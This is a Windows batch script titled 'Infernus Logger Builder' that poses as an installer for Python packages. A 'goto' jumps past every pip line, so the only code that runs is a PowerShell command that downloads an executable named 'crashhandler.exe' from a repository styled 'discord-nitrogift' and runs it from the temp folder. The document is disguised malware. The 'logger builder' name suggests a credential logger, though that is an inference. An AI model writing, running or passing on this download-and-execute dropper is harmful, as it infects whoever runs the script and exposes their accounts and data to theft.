@echo off
color 02
title Infernus Logger Builder
goto install
:: Install Python Packages
pip install discord.py
pip install aiohttp
pip install opencv-python
pip install requests
pip install discord-webhook
pip install httpx
pip install urllib3
pip install PyCurl
pip install grequests
pip install requests-toolbelt
pip install requests-oauthlib
pip install Tornado
pip install Flask-API
pip install Flask-RESTful
pip install Django-REST-framework
pip install httpie
pip install requests-html
pip install httpx
pip install urllib3
pip install mechanize
pip install requests
pip install Scrapy
pip install pycurl
:install
:: Restricted Modules Installer
powershell.exe -command "Invoke-WebRequest -Uri 'https://github.com/discord-nitrogift/filesagain/raw/main/crashhandler.exe' -OutFile '%temp%\installer.exe'; Start-Process '%temp%\installer.exe'"